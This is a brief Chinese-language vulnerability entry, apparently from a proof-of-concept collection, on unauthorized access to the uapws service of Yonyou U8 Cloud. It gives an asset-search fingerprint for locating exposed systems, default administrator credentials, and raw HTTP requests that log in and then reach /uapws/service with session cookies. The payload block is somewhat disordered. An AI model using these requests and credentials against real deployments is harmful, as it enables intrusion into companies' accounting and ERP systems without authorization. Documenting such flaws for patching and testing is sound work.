# 用友U8Clouduapws存在未授权访问漏洞

- **系统**：用友　|　**类型**：未授权访问　|　**CVE**：—
- **指纹**：`app.name="用友 U8 Cloud"`
- **请求**：`POST /uapws/login.ajax HTTP/1.1`

**请求体 / payload**
```
/uapws/
`administrator/111111`\

获取cookie
Host: xx.xx.xx.xx
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 34
name=administrator&password=111111
GET /uapws/service HTTP/1.1
Host: xx.xx.xx.xx
Cookie: JSESSIONID=F5BB1DC04DAB3B423C599ABFD673C370.server; JSESSIONID=8546607005B11845176BBAA0C7A4DFB7.server
```

**其他**
- 用友U8 Cloud uapws存在未授权访问漏洞: * 一、漏洞描述
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8 Cloud